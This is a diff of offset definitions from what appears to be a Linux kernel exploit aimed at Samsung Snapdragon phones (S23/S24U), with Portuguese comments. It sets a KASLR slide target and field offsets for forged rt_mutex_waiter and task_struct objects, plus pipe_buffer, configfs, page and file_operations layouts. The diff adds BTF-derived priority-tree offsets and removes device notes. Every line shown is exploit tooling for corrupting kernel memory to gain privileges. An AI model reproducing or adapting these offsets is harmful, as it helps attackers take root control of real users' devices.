@@ -139,7 +139,7 @@
 #define SLIDE_SYSCTL_BOOTID_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-// Layouts (baseados no S24U Snapdragon - compatível com seu S23)
+// Layouts
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
 #define FOPS_OFF 0x2000
@@ -148,25 +148,29 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-// FAKE_WAITER (COMPACT_RT_MUTEX_WAITER=0)
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
-#define FAKE_WAITER_TASK_OFF 0x30
-#define FAKE_WAITER_LOCK_OFF 0x38
-#define FAKE_WAITER_WAKE_STATE_OFF 0x40
-#define FAKE_WAITER_PRIO_OFF 0x44
-#define FAKE_WAITER_DEADLINE_OFF 0x48
-#define FAKE_WAITER_WW_CTX_OFF 0x50
-#define FAKE_WAITER_LAYOUT_SIZE 0x58
+// FAKE_WAITER — extraído do BTF (rt_mutex_waiter size=88)
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x18
+#define FAKE_WAITER_TASK_OFF             0x30
+#define FAKE_WAITER_LOCK_OFF             0x38
+#define FAKE_WAITER_WAKE_STATE_OFF       0x40
+#define FAKE_WAITER_PRIO_OFF             0x44
+#define FAKE_WAITER_DEADLINE_OFF         0x48
+#define FAKE_WAITER_WW_CTX_OFF           0x50
+#define FAKE_WAITER_LAYOUT_SIZE          0x58
+#define FAKE_WAITER_TREE_PRIO_OFF        0x44
+#define FAKE_WAITER_TREE_DEADLINE_OFF    0x48
+#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x44
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
 
-// FAKE_TASK (seus offsets!)
-#define FAKE_TASK_USAGE_OFF 0x38
-#define FAKE_TASK_PRIO_OFF 0x7c
-#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
-#define FAKE_TASK_TASK_GROUP_OFF 0x400
-#define FAKE_TASK_PI_LOCK_OFF 0x884
-#define FAKE_TASK_PI_WAITERS_OFF 0x898
-#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
-#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
+// FAKE_TASK — seus offsets extraídos do BTF
+#define FAKE_TASK_USAGE_OFF              0x38
+#define FAKE_TASK_PRIO_OFF               0x7c
+#define FAKE_TASK_NORMAL_PRIO_OFF        0x84
+#define FAKE_TASK_TASK_GROUP_OFF         0x400
+#define FAKE_TASK_PI_LOCK_OFF            0x884
+#define FAKE_TASK_PI_WAITERS_OFF         0x898
+#define FAKE_TASK_PI_TOP_TASK_OFF        0x8a8
+#define FAKE_TASK_PI_BLOCKED_ON_OFF      0x8b0
 
 // configfs
 #define CFG_PAGE_OFF 16
@@ -191,7 +195,7 @@
 #define WORK_ENTRY_OFF 0x08
 #define WORK_FUNC_OFF 0x18
 
-// page (compatível com S24U)
+// page
 #define STRUCT_PAGE_SIZE 0x40
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF 0x18
@@ -200,7 +204,7 @@
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
 
-// file_operations (compatível com S24U)
+// file_operations
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
 #define FOPS_READ_OFF 0x10
